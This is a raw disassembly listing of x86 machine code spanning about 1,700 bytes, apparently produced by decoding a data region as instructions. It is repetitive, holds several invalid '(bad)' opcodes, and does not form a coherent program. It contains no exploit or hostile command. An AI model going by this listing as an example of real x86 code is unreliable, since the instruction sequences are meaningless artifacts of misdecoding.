  44b5f2:	inc    DWORD PTR [eax]
  44b5f4:	add    BYTE PTR [edi],cl
  44b5f6:	inc    DWORD PTR [eax]
  44b5f8:	add    BYTE PTR [esi],cl
  44b5fa:	inc    DWORD PTR [eax]
  44b5fc:	add    BYTE PTR [esi],cl
  44b5fe:	inc    DWORD PTR [eax]
  44b600:	add    DWORD PTR [ecx],eax
  44b602:	inc    DWORD PTR [ecx]
  44b604:	add    DWORD PTR [eax],eax
  44b606:	dec    DWORD PTR [eax]
  44b608:	pop    ds
  44b609:	test   bh,bh
  44b60b:	pop    es
  44b60c:	add    eax,0x100cff0c
  44b611:	aaa    
  44b612:	call   FWORD PTR [edi]
  44b614:	push   ds
  44b615:	dec    ebx
  44b616:	dec    DWORD PTR [esi]
  44b618:	adc    DWORD PTR [edx],edi
  44b61a:	dec    DWORD PTR [esi]
  44b61c:	push   cs
  44b61d:	aaa    
  44b61e:	call   DWORD PTR ds:0x4ff7321
  44b624:	push   ss
  44b625:	outs   dx,DWORD PTR ds:[esi]
  44b626:	inc    DWORD PTR [ecx]
  44b628:	add    DWORD PTR [ecx],eax
  44b62a:	inc    DWORD PTR [eax]
  44b62c:	add    BYTE PTR [ebx],cl
  44b62e:	inc    DWORD PTR [eax]
  44b630:	add    BYTE PTR [ebx],cl
  44b632:	inc    DWORD PTR [eax]
  44b634:	add    BYTE PTR [ebx],cl
  44b636:	inc    DWORD PTR [edi]
  44b638:	add    eax,0x203ff07
  44b63d:	add    bh,bh
  44b63f:	add    DWORD PTR [ecx],eax
  44b641:	add    bh,bh
  44b643:	or     eax,0x22ff6b17
  44b648:	push   ds
  44b649:	cmp    eax,0x2a1721ff
  44b64e:	(bad)  
  44b64f:	cmp    eax,0x1bff4629
  44b654:	adc    eax,0xb13ff25
  44b659:	adc    al,0xff
  44b65b:	sbb    BYTE PTR ds:0x3310ff6d,bl
  44b661:	fdiv   st(7),st
  44b663:	add    al,BYTE PTR [ebx]
  44b665:	sbb    bh,bh
  44b667:	add    eax,0xff0504
  44b66c:	add    BYTE PTR [eax],cl
  44b66e:	inc    DWORD PTR [eax]
  44b670:	add    BYTE PTR [esi],al
  44b672:	inc    DWORD PTR [ecx]
  44b674:	add    DWORD PTR [eax],eax
  44b676:	inc    DWORD PTR [esi+eax*1]
  44b679:	inc    ebp
  44b67a:	call   DWORD PTR [esp+edx*1]
  44b67d:	outs   dx,BYTE PTR ds:[esi]
  44b67e:	call   FWORD PTR [edi]
  44b680:	sbb    BYTE PTR [esi],ah
  44b682:	jmp    DWORD PTR [ecx]
  44b684:	pop    ss
  44b685:	sub    bh,bh
  44b687:	sbb    al,0x18
  44b689:	jmp    DWORD PTR ss:0x1bff8825
  44b690:	sbb    bh,BYTE PTR [edx]
  44b692:	inc    DWORD PTR [eax]
  44b694:	add    al,BYTE PTR [edx]
  44b696:	dec    DWORD PTR [edx*1+0x302ffc1]
  44b69d:	ins    DWORD PTR es:[edi],dx
  44b69e:	inc    DWORD PTR [ecx]
  44b6a0:	add    DWORD PTR [eax],eax
  44b6a2:	inc    DWORD PTR [ecx]
  44b6a4:	add    DWORD PTR [eax],eax
  44b6a6:	inc    DWORD PTR [ecx]
  44b6a8:	add    DWORD PTR [eax],eax
  44b6aa:	inc    DWORD PTR [eax]
  44b6ac:	add    BYTE PTR [ecx],cl
  44b6ae:	inc    DWORD PTR [eax]
  44b6b0:	add    BYTE PTR [edx],cl
  44b6b2:	inc    DWORD PTR [eax]
  44b6b4:	add    BYTE PTR [ebx],cl
  44b6b6:	inc    DWORD PTR [eax]
  44b6b8:	add    BYTE PTR [ebx],cl
  44b6ba:	inc    DWORD PTR [eax]
  44b6bc:	add    BYTE PTR [edx],cl
  44b6be:	inc    DWORD PTR [eax]
  44b6c0:	add    BYTE PTR [edi+edi*8],cl
  44b6c3:	add    BYTE PTR [eax],al
  44b6c5:	or     al,0xff
  44b6c7:	add    BYTE PTR [eax],al
  44b6c9:	or     al,0xff
  44b6cb:	add    BYTE PTR [eax],al
  44b6cd:	or     al,0xff
  44b6cf:	add    al,0x4
  44b6d1:	or     al,0xff
  44b6d3:	add    DWORD PTR [ecx],eax
  44b6d5:	add    bh,bh
  44b6d7:	add    DWORD PTR [ecx],eax
  44b6d9:	add    bh,bh
  44b6db:	push   es
  44b6dc:	or     ebx,DWORD PTR [esi-0x1]
  44b6df:	add    DWORD PTR [ecx],eax
  44b6e1:	add    bh,bh
  44b6e3:	add    DWORD PTR [ecx],eax
  44b6e5:	add    bh,bh
  44b6e7:	add    BYTE PTR [eax],al
  44b6e9:	or     eax,0xe0000ff
  44b6ee:	inc    DWORD PTR [eax]
  44b6f0:	add    BYTE PTR [esi],cl
  44b6f2:	inc    DWORD PTR [eax]
  44b6f4:	add    BYTE PTR [edi],cl
  44b6f6:	inc    DWORD PTR [eax]
  44b6f8:	add    BYTE PTR [edi],cl
  44b6fa:	inc    DWORD PTR [eax]
  44b6fc:	add    BYTE PTR [esi],cl
  44b6fe:	inc    DWORD PTR [ecx]
  44b700:	add    BYTE PTR [ecx],al
  44b702:	inc    DWORD PTR [ecx]
  44b704:	add    DWORD PTR [eax],eax
  44b706:	inc    DWORD PTR [ecx]
  44b708:	pop    es
  44b709:	mov    al,ds:0xb060dff
  44b70e:	inc    DWORD PTR [esi]
  44b710:	or     BYTE PTR [esi],ch
  44b712:	call   DWORD PTR [ecx]
  44b714:	adc    DWORD PTR [eax],edi
  44b716:	dec    DWORD PTR [edx]
  44b718:	or     ch,BYTE PTR [esi]
  44b71a:	call   FWORD PTR [eax]
  44b71c:	sbb    BYTE PTR [edi],dh
  44b71e:	jmp    DWORD PTR [edx]
  44b720:	das    
  44b721:	mov    bh,bh
  44b723:	add    dl,BYTE PTR [esp+edi*2]
  44b726:	inc    DWORD PTR [ecx]
  44b728:	add    DWORD PTR [edx],eax
  44b72a:	inc    DWORD PTR [eax]
  44b72c:	add    BYTE PTR [edx],cl
  44b72e:	inc    DWORD PTR [eax]
  44b730:	add    BYTE PTR [ebx],cl
  44b732:	inc    DWORD PTR [esp+eax*1]
  44b735:	add    edi,edi
  44b737:	add    al,BYTE PTR [ecx]
  44b739:	add    bh,bh
  44b73b:	add    cl,BYTE PTR [ecx]
  44b73d:	xor    edi,edi
  44b73f:	or     al,0x19
  44b741:	lahf   
  44b742:	call   DWORD PTR [edi+ebx*1]
  44b745:	lahf   
  44b746:	call   DWORD PTR [eax]
  44b748:	push   ss
  44b749:	jmp    FWORD PTR gs:[eax]
  44b74c:	and    eax,0x1e27ff4a
  44b751:	aaa    
  44b752:	call   DWORD PTR [edi]
  44b754:	adc    bl,BYTE PTR [esi]
  44b756:	call   DWORD PTR ds:0x17ff1d0c
  44b75c:	daa    
  44b75d:	lods   eax,DWORD PTR ds:[esi]
  44b75e:	dec    DWORD PTR [ebx]
  44b760:	and    eax,0x204ffc4
  44b765:	add    bh,bh
  44b767:	add    al,BYTE PTR [edx]
  44b769:	pop    es
  44b76a:	inc    DWORD PTR [eax]
  44b76c:	add    BYTE PTR [esi],al
  44b76e:	inc    DWORD PTR [eax]
  44b770:	add    BYTE PTR [edi+edi*8],al
  44b773:	or     DWORD PTR [eax],ecx
  44b775:	add    eax,0x3e0502ff
  44b77a:	call   DWORD PTR [edx]
  44b77c:	adc    DWORD PTR [ecx-0x1],edx
  44b77f:	sbb    al,0x1a
  44b781:	sub    bh,bh
  44b783:	and    al,0x1d
  44b785:	xor    bh,bh
  44b787:	sbb    eax,0xbff2d1a
  44b78c:	or     al,0x6b
  44b78e:	inc    DWORD PTR [edi]
  44b790:	push   es
  44b791:	xor    al,0xff
  44b793:	add    DWORD PTR [edx],eax
  44b795:	mov    bh,bh
  44b797:	add    DWORD PTR [ecx],eax
  44b799:	add    bh,bh
  44b79b:	add    BYTE PTR [eax],al
  44b79d:	and    eax,0xd22412ff
  44b7a2:	inc    DWORD PTR [ecx]
  44b7a4:	add    DWORD PTR [eax],eax
  44b7a6:	inc    DWORD PTR [ecx]
  44b7a8:	add    DWORD PTR [eax],eax
  44b7aa:	inc    DWORD PTR [ecx]
  44b7ac:	add    DWORD PTR [eax],eax
  44b7ae:	inc    DWORD PTR [eax]
  44b7b0:	add    BYTE PTR [edx],cl
  44b7b2:	inc    DWORD PTR [eax]
  44b7b4:	add    BYTE PTR [eax],cl
  44b7b6:	inc    DWORD PTR [eax]
  44b7b8:	add    BYTE PTR [eax],cl
  44b7ba:	inc    DWORD PTR [eax]
  44b7bc:	add    BYTE PTR [ecx],cl
  44b7be:	inc    DWORD PTR [eax]
  44b7c0:	add    BYTE PTR [ebx],cl
  44b7c2:	inc    DWORD PTR [eax]
  44b7c4:	add    BYTE PTR [ebx],cl
  44b7c6:	inc    DWORD PTR [eax]
  44b7c8:	add    BYTE PTR ds:0x101ff,cl
  44b7ce:	inc    DWORD PTR [ecx]
  44b7d0:	add    DWORD PTR [eax],eax
  44b7d2:	inc    DWORD PTR [ecx]
  44b7d4:	add    DWORD PTR [eax],eax
  44b7d6:	dec    DWORD PTR [ebx]
  44b7d8:	adc    edx,DWORD PTR [ebx-0x5be4ee01]
  44b7de:	inc    DWORD PTR [eax]
  44b7e0:	add    BYTE PTR [edi],dh
  44b7e2:	inc    DWORD PTR [ecx]
  44b7e4:	add    DWORD PTR [eax],eax
  44b7e6:	inc    DWORD PTR [eax]
  44b7e8:	add    BYTE PTR [ebx],cl
  44b7ea:	inc    DWORD PTR [eax]
  44b7ec:	add    BYTE PTR [ebx],cl
  44b7ee:	inc    DWORD PTR [eax]
  44b7f0:	add    BYTE PTR [edi+edi*8],cl
  44b7f3:	add    BYTE PTR [eax],al
  44b7f5:	or     eax,0xb0000ff
  44b7fa:	inc    DWORD PTR [eax]
  44b7fc:	add    BYTE PTR [ebx],cl
  44b7fe:	inc    DWORD PTR [ecx]
  44b800:	add    DWORD PTR [eax],eax
  44b802:	inc    DWORD PTR [ecx]
  44b804:	add    DWORD PTR [eax],eax
  44b806:	inc    DWORD PTR [eax]
  44b808:	psubsb mm7,mm7
  44b80b:	add    eax,0xeff5809
  44b810:	sbb    BYTE PTR [edx],bh
  44b812:	inc    DWORD PTR [ebx+ecx*1]
  44b815:	sub    al,0xff
  44b817:	sbb    DWORD PTR [edx],ebx
  44b819:	jmp    DWORD PTR ss:[esi]
  44b81c:	and    edx,DWORD PTR [ebx-0x1]
  44b81f:	adc    ebp,DWORD PTR [esi]
  44b821:	(bad)  
  44b822:	inc    DWORD PTR [edx]
  44b824:	pop    es
  44b825:	outs   dx,BYTE PTR ds:[esi]
  44b826:	inc    DWORD PTR [ecx]
  44b828:	add    al,BYTE PTR ds:0x10101ff
  44b82e:	inc    DWORD PTR [ecx]
  44b830:	add    DWORD PTR [eax],eax
  44b832:	inc    DWORD PTR [eax]
  44b834:	add    BYTE PTR [ecx],al
  44b836:	inc    DWORD PTR ds:0xfff7818
  44b83c:	sub    bl,bl
  44b83e:	call   DWORD PTR [edi]
  44b840:	and    ebp,DWORD PTR [ecx+0x7b1e21ff]
  44b846:	jmp    DWORD PTR [eax]
  44b848:	sbb    al,0x3a
  44b84a:	call   DWORD PTR [eax]
  44b84c:	sbb    dh,BYTE PTR [edx-0x1]
  44b84f:	sbb    al,0x1f
  44b851:	pop    edi
  44b852:	call   FWORD PTR [edx]
  44b854:	adc    bl,BYTE PTR [edi]
  44b856:	call   FWORD PTR [edi]
  44b858:	adc    al,0x26
  44b85a:	call   DWORD PTR [esp+ebp*1]
  44b85d:	ret    
  44b85e:	inc    DWORD PTR [ecx]
  44b860:	or     dl,BYTE PTR [edi-0x1]
  44b863:	add    eax,0xff0005
  44b868:	add    BYTE PTR [esi],al
  44b86a:	inc    DWORD PTR [eax]
  44b86c:	add    BYTE PTR ds:0x50000ff,al
  44b872:	inc    DWORD PTR [ecx]
  44b874:	add    DWORD PTR [edi+edi*8],eax
  44b877:	add    BYTE PTR [eax],al
  44b879:	sbb    bh,bh
  44b87b:	push   cs
  44b87c:	push   cs
  44b87d:	pop    ebp
  44b87e:	call   FWORD PTR [ecx+ebx*1]
  44b881:	call   FWORD PTR es:[ecx+ebx*1]
  44b885:	push   ds
  44b886:	jmp    DWORD PTR [ecx]
  44b888:	and    ecx,DWORD PTR [edi-0x1]
  44b88b:	push   cs
  44b88c:	sbb    BYTE PTR [esi+0x580402ff],dh
  44b892:	inc    DWORD PTR [ecx]
  44b894:	add    DWORD PTR [eax],eax
  44b896:	inc    DWORD PTR [edx]
  44b898:	add    al,BYTE PTR [eax]
  44b89a:	call   FWORD PTR [eax]
  44b89c:	sub    ecx,edi
  44b89e:	dec    DWORD PTR [eax]
  44b8a0:	adc    BYTE PTR [ecx-0x7cf7fb01],al
  44b8a6:	inc    DWORD PTR [esp+eax*1]
  44b8a9:	xor    al,0xff
  44b8ab:	add    DWORD PTR [ecx],eax
  44b8ad:	add    bh,bh
  44b8af:	add    DWORD PTR [ecx],eax
  44b8b1:	add    bh,bh
  44b8b3:	add    DWORD PTR [ecx],eax
  44b8b5:	add    bh,bh
  44b8b7:	add    DWORD PTR [edx],eax
  44b8b9:	add    edi,edi
  44b8bb:	add    al,BYTE PTR [edx]
  44b8bd:	add    bh,bh
  44b8bf:	add    DWORD PTR [ecx],eax
  44b8c1:	add    edi,edi
  44b8c3:	add    DWORD PTR [edx],eax
  44b8c5:	add    bh,bh
  44b8c7:	add    DWORD PTR [ecx],eax
  44b8c9:	add    edi,edi
  44b8cb:	add    DWORD PTR [ecx],eax
  44b8cd:	add    bh,bh
  44b8cf:	or     DWORD PTR ds:0x2518ff49,ecx
  44b8d5:	xchg   bh,bh
  44b8d7:	adc    BYTE PTR [esi],dl
  44b8d9:	sub    edi,edi
  44b8db:	or     DWORD PTR [eax],ebx
  44b8dd:	test   edi,edi
  44b8df:	add    ecx,DWORD PTR ds:0x101ff8a
  44b8e5:	add    bh,bh
  44b8e7:	add    BYTE PTR [eax],al
  44b8e9:	or     edi,edi
  44b8eb:	add    BYTE PTR [eax],al
  44b8ed:	or     al,0xff
  44b8ef:	add    BYTE PTR [eax],al
  44b8f1:	or     eax,0xd0000ff
  44b8f6:	inc    DWORD PTR [eax]
  44b8f8:	add    BYTE PTR [ebx],cl
  44b8fa:	inc    DWORD PTR [eax]
  44b8fc:	add    BYTE PTR [edi+edi*8],cl
  44b8ff:	add    DWORD PTR [ecx],eax
  44b901:	add    bh,bh
  44b903:	add    DWORD PTR [ecx],eax
  44b905:	add    bh,bh
  44b907:	add    ebx,DWORD PTR [edx]
  44b909:	int    0xff
  44b90b:	add    eax,DWORD PTR ds:0x130dffa7
  44b911:	pusha  
  44b912:	call   FWORD PTR [ebx]
  44b914:	push   ds
  44b915:	dec    esi
  44b916:	jmp    DWORD PTR [ecx]
  44b918:	and    eax,0x3222ff4a
  44b91d:	push   0xffffffff
  44b91f:	or     al,0x20
  44b921:	iret   
  44b922:	dec    DWORD PTR [eax]
  44b924:	or     DWORD PTR ds:0x220908ff,ebx
  44b92a:	inc    DWORD PTR [ebx]
  44b92c:	add    dl,BYTE PTR [edx]
  44b92e:	inc    DWORD PTR ds:0xff0a06
  44b934:	add    DWORD PTR [ecx-0x1],eax
  44b937:	or     BYTE PTR [ecx],bl
  44b939:	mov    dh,0xff
  44b93b:	pop    ss
  44b93c:	push   ds
  44b93d:	dec    edx
  44b93e:	jmp    DWORD PTR [ebx]
  44b940:	and    DWORD PTR [ebx-0x1],edx
  44b943:	and    bl,BYTE PTR [esi]
  44b945:	aas    
  44b946:	jmp    FWORD PTR [edx]
  44b948:	and    DWORD PTR [esi-0x1],eax
  44b94b:	sbb    edx,DWORD PTR ds:0x1b14ff47
  44b951:	push   edx
  44b952:	call   DWORD PTR [edi]
  44b954:	sbb    DWORD PTR [ebx-0x1],ebp
  44b957:	sbb    esp,DWORD PTR ds:0x1d0cff98
  44b95d:	iret   
  44b95e:	inc    DWORD PTR [ecx]
  44b960:	add    ecx,DWORD PTR [edi+edi*8]
  44b963:	add    DWORD PTR [ecx],eax
  44b965:	add    edi,edi
  44b967:	add    BYTE PTR [eax],al
  44b969:	push   es
  44b96a:	inc    DWORD PTR [eax]
  44b96c:	add    BYTE PTR [edi+edi*8],al
  44b96f:	add    BYTE PTR [eax],al
  44b971:	add    bh,bh
  44b973:	add    BYTE PTR [eax],al
  44b975:	add    bh,bh
  44b977:	or     DWORD PTR [eax],ecx
  44b979:	add    eax,0x5b0704ff
  44b97e:	call   FWORD PTR [edx]
  44b980:	and    DWORD PTR [eax-0x1],edi
  44b983:	sbb    al,0x21
  44b985:	push   0x690705ff
  44b98a:	inc    DWORD PTR [edx]
  44b98c:	push   es
  44b98d:	push   esp
  44b98e:	inc    DWORD PTR [ecx]
  44b990:	add    DWORD PTR [eax],eax
  44b992:	inc    DWORD PTR [ecx]
  44b994:	add    DWORD PTR [eax],eax
  44b996:	jmp    DWORD PTR [eax]
  44b998:	sub    DWORD PTR [edx+0x582732ff],esp
  44b99e:	jmp    FWORD PTR [edx]
  44b9a0:	push   ds
  44b9a1:	sub    bh,bh
  44b9a3:	and    eax,0x12ff611d
  44b9a8:	push   cs
  44b9a9:	jg     0x44b9aa
  44b9ab:	sub    DWORD PTR [edx],esp
  44b9ad:	imul   edi,edi,0x14
  44b9b0:	sbb    al,0x7a
  44b9b2:	inc    DWORD PTR ds:0x7ff460e
  44b9b8:	(bad)  
  44b9ba:	inc    DWORD PTR ds:0xcff4a10
  44b9c0:	sbb    DWORD PTR [ecx-0x1],edx
  44b9c3:	add    al,0xe
  44b9c5:	push   0xffffffff
  44b9c7:	add    DWORD PTR [edx],eax
  44b9c9:	jno    0x44b9ca
  44b9cb:	push   cs
  44b9cc:	sbb    edx,DWORD PTR [ebp-0x75d9ea01]
  44b9d2:	call   FWORD PTR [ecx]
  44b9d4:	sub    BYTE PTR [edx-0x1],bh
  44b9d7:	or     cl,BYTE PTR [edi]
  44b9d9:	cmp    eax,0x8b180bff
  44b9de:	inc    DWORD PTR [esi]
  44b9e0:	push   ds
  44b9e1:	lahf   
  44b9e2:	inc    DWORD PTR [ecx]
  44b9e4:	add    DWORD PTR [eax],eax
  44b9e6:	inc    DWORD PTR [eax]
  44b9e8:	add    BYTE PTR ds:0x50000ff,al
  44b9ee:	inc    DWORD PTR [eax]
  44b9f0:	add    BYTE PTR [esi],al
  44b9f2:	inc    DWORD PTR [eax]
  44b9f4:	add    BYTE PTR ds:0x50000ff,al
  44b9fa:	inc    DWORD PTR [eax]
  44b9fc:	add    BYTE PTR ds:0x101ff,al
  44ba02:	inc    DWORD PTR [ecx]
  44ba04:	add    DWORD PTR [eax],eax
  44ba06:	inc    DWORD PTR [esi]
  44ba08:	sbb    al,0xaa
  44ba0a:	call   DWORD PTR [eax]
  44ba0c:	adc    eax,0xe0eff3d
  44ba11:	dec    esi
  44ba12:	jmp    DWORD PTR [esi+ebx*1]
  44ba15:	cmp    bh,bh
  44ba17:	and    al,0x23
  44ba19:	inc    ecx
  44ba1a:	call   DWORD PTR [eax]
  44ba1c:	and    eax,0x1009ffb3
  44ba21:	push   ecx
  44ba22:	call   DWORD PTR [ecx]
  44ba24:	adc    esi,DWORD PTR [edi]
  44ba26:	call   FWORD PTR [ebx]
  44ba28:	sbb    al,0x49
  44ba2a:	call   DWORD PTR [eax]
  44ba2c:	push   ss
  44ba2d:	ins    BYTE PTR es:[edi],dx
  44ba2e:	inc    DWORD PTR [edi+eax*1]
  44ba31:	xor    al,0xff
  44ba33:	add    BYTE PTR [eax*4+0x400f0aff],al
  44ba3a:	call   DWORD PTR [edi]
  44ba3c:	pop    ss
  44ba3d:	and    eax,0x311d22ff
  44ba42:	call   FWORD PTR [ecx]
  44ba44:	push   ss
  44ba45:	inc    esi
  44ba46:	jmp    FWORD PTR ds:0x2aff6425
  44ba4c:	and    ah,BYTE PTR [ebp-0x1]
  44ba4f:	add    al,BYTE PTR [edx]
  44ba51:	inc    esp
  44ba52:	dec    DWORD PTR [ecx]
  44ba54:	push   cs
  44ba55:	aaa    
  44ba56:	dec    DWORD PTR [esi]
  44ba58:	sbb    cl,ah
  44ba5a:	inc    DWORD PTR [edx]
  44ba5c:	add    eax,0x505ff5e
  44ba61:	add    bh,bh
  44ba63:	add    DWORD PTR [ecx],eax
  44ba65:	add    al,0xff
  44ba67:	add    BYTE PTR [eax],al
  44ba69:	add    bh,bh
  44ba6b:	add    BYTE PTR [eax],al
  44ba6d:	add    bh,bh
  44ba6f:	add    BYTE PTR [eax],al
  44ba71:	add    bh,bh
  44ba73:	add    BYTE PTR [eax],al
  44ba75:	add    bh,bh
  44ba77:	add    BYTE PTR [eax],al
  44ba79:	add    edi,edi
  44ba7b:	or     DWORD PTR [ecx],ecx
  44ba7d:	or     eax,0x610a01ff
  44ba82:	dec    DWORD PTR [edx]
  44ba84:	or     al,0x8e
  44ba86:	inc    DWORD PTR [esi]
  44ba88:	or     al,0x8d
  44ba8a:	inc    DWORD PTR [esi]
  44ba8c:	push   cs
  44ba8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44ba8e:	inc    DWORD PTR [ecx]
  44ba90:	add    esp,DWORD PTR [edi]
  44ba92:	inc    DWORD PTR [edi]
  44ba94:	add    eax,0x1d24ff5d
  44ba99:	push   ecx
  44ba9a:	jmp    FWORD PTR [esi]
  44ba9c:	and    al,0x2e
  44ba9e:	call   FWORD PTR ds:0x1bff2610
  44baa4:	adc    al,BYTE PTR [ecx-0x1]
  44baa7:	adc    BYTE PTR ds:0x242fff65,cl
  44baad:	pusha  
  44baae:	jmp    FWORD PTR [esi+eiz*1]
  44bab1:	inc    ebp
  44bab2:	jmp    DWORD PTR [eax]
  44bab4:	and    al,0x62
  44bab6:	call   FWORD PTR [eax]
  44bab8:	sbb    esi,DWORD PTR [ecx-0x1]
  44babb:	sbb    eax,0x1fff8123
  44bac0:	sub    al,0x9f
  44bac2:	call   FWORD PTR [edx]
  44bac4:	and    eax,0x2318ff8c
  44bac9:	mov    eax,ds:0x832d1cff
  44bace:	call   FWORD PTR [ecx]
  44bad0:	and    DWORD PTR [edi+edi*8+0x1a],edi
  44bad4:	pop    ds
  44bad5:	pop    esi
  44bad6:	call   DWORD PTR ds:0xaff5b15
  44badc:	adc    edi,DWORD PTR [edi+edi*8+0xb]
  44bae0:	and    al,cl
  44bae2:	inc    DWORD PTR [ecx]
  44bae4:	add    DWORD PTR [eax],eax
  44bae6:	inc    DWORD PTR [eax]
  44bae8:	add    BYTE PTR [eax],al
  44baea:	inc    DWORD PTR [eax]
  44baec:	add    BYTE PTR [eax],al
  44baee:	inc    DWORD PTR [eax]
  44baf0:	add    BYTE PTR [eax],al
  44baf2:	inc    DWORD PTR [eax]
  44baf4:	add    BYTE PTR [eax],al
  44baf6:	inc    DWORD PTR [eax]
  44baf8:	add    BYTE PTR [eax],al
  44bafa:	inc    DWORD PTR [eax]
  44bafc:	add    BYTE PTR [eax],al
  44bafe:	inc    DWORD PTR [ecx]
  44bb00:	add    DWORD PTR [eax],eax
  44bb02:	inc    DWORD PTR [ecx]
  44bb04:	add    edi,DWORD PTR [ebp-0x1]
  44bb07:	or     al,0x1f
  44bb09:	mov    edi,0x241714ff
  44bb0e:	call   DWORD PTR [edx]
  44bb10:	adc    DWORD PTR [edi],ebx
  44bb12:	call   FWORD PTR [ecx]
  44bb14:	sbb    al,0x26
  44bb16:	dec    DWORD PTR [ebx]
  44bb18:	adc    DWORD PTR [edi+edi*8-0x91f2f9],eax
  44bb1f:	or     eax,0x14ff300f
  44bb24:	adc    al,0x38
  44bb26:	jmp    DWORD PTR [eax]
  44bb28:	sbb    eax,DWORD PTR [edx-0x1]
  44bb2b:	and    bl,BYTE PTR [edi]
  44bb2d:	dec    ecx
  44bb2e:	call   DWORD PTR [ecx]
  44bb30:	adc    DWORD PTR [edx-0x1],edx
  44bb33:	adc    edx,DWORD PTR [esi*2+0x382021ff]
  44bb3a:	jmp    DWORD PTR [esi]
  44bb3c:	and    bh,BYTE PTR [edi]
  44bb3e:	call   DWORD PTR [esi]
  44bb40:	adc    ebp,DWORD PTR [ecx]
  44bb42:	call   DWORD PTR [edi]
  44bb44:	adc    eax,0x1c23ff42
  44bb49:	mov    bh,bh
  44bb4b:	aaa    
  44bb4c:	sub    al,0x6a
  44bb4e:	inc    DWORD PTR [esi]
  44bb50:	or     bl,BYTE PTR [ebp+0x1ff]
  44bb56:	dec    DWORD PTR ds:0x3ff9919
  44bb5c:	push   es
  44bb5d:	adc    bh,bh
  44bb5f:	or     BYTE PTR [esi],al
  44bb61:	add    al,0xff
  44bb63:	add    BYTE PTR [eax],al
  44bb65:	add    bh,bh
  44bb67:	add    BYTE PTR [eax],al
  44bb69:	add    bh,bh
  44bb6b:	add    BYTE PTR [eax],al
  44bb6d:	add    bh,bh
  44bb6f:	add    BYTE PTR [eax],al
  44bb71:	add    bh,bh
  44bb73:	add    BYTE PTR [eax],al
  44bb75:	add    bh,bh
  44bb77:	add    BYTE PTR [eax],al
  44bb79:	add    bh,bh
  44bb7b:	or     eax,0x1ff050b
  44bb80:	add    DWORD PTR [eax],eax
  44bb82:	dec    DWORD PTR [eax]
  44bb84:	push   ss
  44bb85:	(bad)  
  44bb86:	jmp    DWORD PTR [ebx*1+0xd0eff5b]
  44bb8d:	adc    edi,edi
  44bb8f:	and    esp,DWORD PTR [eax]
  44bb91:	aas    
  44bb92:	jmp    DWORD PTR [eax]
  44bb94:	push   ss
  44bb95:	cmp    eax,0x351920ff
  44bb9a:	jmp    DWORD PTR [edi]
  44bb9c:	and    DWORD PTR [edi-0x1],ecx
  44bb9f:	sub    ebx,DWORD PTR [esi]
  44bba1:	jmp    DWORD PTR ss:[eax]
  44bba4:	adc    dh,BYTE PTR [edi]
  44bba6:	call   DWORD PTR [edi]
  44bba8:	subps  xmm7,xmm7
  44bbab:	and    BYTE PTR [esi],dl
  44bbad:	push   DWORD PTR gs:0x20ff3d2b
  44bbb4:	pop    ds
  44bbb5:	cmp    bh,bh
  44bbb7:	and    BYTE PTR [ecx],ah
  44bbb9:	push   esi
  44bbba:	call   FWORD PTR ds:0x15ff671f
  44bbc0:	sbb    ch,BYTE PTR [eax-0x1]
  44bbc3:	sbb    esp,DWORD PTR [eax]
  44bbc5:	jae    0x44bbc6
  44bbc7:	sbb    ebx,DWORD PTR ds:0x241cff56
  44bbcd:	outs   dx,DWORD PTR ds:[esi]
  44bbce:	call   FWORD PTR ds:0x22ff6920
  44bbd4:	and    BYTE PTR [eax-0x1],bl
  44bbd7:	adc    eax,0x12ff4714
  44bbdc:	and    esi,DWORD PTR [edi+edi*8-0x4cdcf5]
  44bbe3:	add    DWORD PTR [ecx],eax
  44bbe5:	add    bh,bh
  44bbe7:	add    BYTE PTR [eax],al
  44bbe9:	add    bh,bh
  44bbeb:	add    BYTE PTR [eax],al
  44bbed:	add    bh,bh
  44bbef:	add    BYTE PTR [eax],al
  44bbf1:	add    bh,bh
  44bbf3:	add    BYTE PTR [eax],al
  44bbf5:	add    bh,bh
  44bbf7:	add    BYTE PTR [eax],al
  44bbf9:	add    bh,bh
  44bbfb:	add    BYTE PTR [eax],al
  44bbfd:	add    bh,bh
  44bbff:	add    DWORD PTR [ecx],eax
  44bc01:	add    bh,bh
  44bc03:	add    al,0x18
  44bc05:	mov    ah,0xff
  44bc07:	sbb    DWORD PTR [ecx],esi
  44bc09:	test   eax,0x260b09ff
  44bc0e:	dec    DWORD PTR ds:0x8ff2e0d
  44bc14:	pcmpgtw mm7,mm7
  44bc17:	add    ecx,DWORD PTR [ecx]
  44bc19:	call   DWORD PTR [bx+di]
  44bc1c:	pop    ss
  44bc1d:	pop    eax
  44bc1e:	call   DWORD PTR [edx*1+0x1415ff3d]
  44bc25:	cmp    bh,bh
  44bc27:	sbb    DWORD PTR [esi],edx
  44bc29:	cmp    bh,bh
  44bc2b:	and    ebx,DWORD PTR ds:0x181aff3f
  44bc31:	inc    edx
  44bc32:	call   FWORD PTR [esi]
  44bc34:	and    BYTE PTR [edx-0x1],cl
  44bc37:	(bad)  
  44bc38:	rdmsr  
  44bc3a:	jmp    FWORD PTR [ecx]
  44bc3c:	and    edi,DWORD PTR [edi]
  44bc3e:	jmp    FWORD PTR [eiz*1+0x2324ff43]
  44bc45:	dec    esp
  44bc46:	call   FWORD PTR [edi]
  44bc48:	and    BYTE PTR [esi+0x6b303cff],dl
  44bc4e:	call   DWORD PTR [esi]
  44bc50:	and    al,0xd2
  44bc52:	dec    DWORD PTR [esi]
  44bc54:	push   ds
  44bc55:	mov    ch,0xff
  44bc57:	or     DWORD PTR [eax],edx
  44bc59:	inc    esi
  44bc5a:	dec    DWORD PTR [ecx]
  44bc5c:	or     BYTE PTR [edi],al
  44bc5e:	inc    DWORD PTR [eax]
  44bc60:	add    BYTE PTR [ecx],al
  44bc62:	inc    DWORD PTR [eax]
  44bc64:	add    BYTE PTR [eax],al
  44bc66:	inc    DWORD PTR [eax]
  44bc68:	add    BYTE PTR [eax],al
  44bc6a:	inc    DWORD PTR [eax]
  44bc6c:	add    BYTE PTR [eax],al
  44bc6e:	inc    DWORD PTR [eax]
  44bc70:	add    BYTE PTR [eax],al
  44bc72:	inc    DWORD PTR [eax]
  44bc74:	add    BYTE PTR [eax],al
  44bc76:	inc    DWORD PTR [eax]
  44bc78:	add    BYTE PTR [eax],al
  44bc7a:	inc    DWORD PTR [eax]
  44bc7c:	add    BYTE PTR [eax],al
  44bc7e:	inc    DWORD PTR [edx]
  44bc80:	add    al,BYTE PTR [ecx]
  44bc82:	inc    DWORD PTR [ecx]
  44bc84:	add    DWORD PTR [eax],eax
  44bc86:	call   FWORD PTR [edx]
  44bc88:	sbb    al,0x93
  44bc8a:	call   FWORD PTR [eax]
